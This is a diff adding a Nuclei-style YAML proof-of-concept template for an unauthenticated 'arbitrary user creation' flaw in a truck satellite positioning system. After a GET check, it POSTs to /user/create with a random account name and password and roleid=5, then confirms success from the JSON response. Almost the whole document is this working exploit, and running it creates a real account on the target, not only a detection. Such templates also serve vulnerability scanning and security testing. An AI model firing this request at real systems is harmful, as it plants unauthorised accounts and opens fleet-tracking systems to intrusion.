@@ -1,0 +1,53 @@
+id: poc-yaml-tsps-create-anyuser-create
+info:
+  name: 卡车卫星定位系统 create 任意用户创建漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: access-control
+
+variables:
+  t1: "{{rand_text_alphanumeric(5)}}"
+  t2: "{{rand_text_alphanumeric(6)}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/user/create"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"code":201'
+      - type: word
+        part: body
+        words:
+          - "false"
+        negative: true
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/user/create"
+    headers:
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    body: "account={{t1}}&id=&password={{t2}}&passwordRepeat={{t2}}&groupName=111&roleid=5&validend=&phone=&email=&chncount=36&flowType=1&oldFlowType=&flowVal=&flowAlarmVal=&oldFlowAlarmVal=&logContent=111&guid=222&token="
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"code":200'
+      - type: word
+        part: body
+        words:
+          - '"result":true'
+      - type: word
+        part: header
+        words:
+          - "application/json"
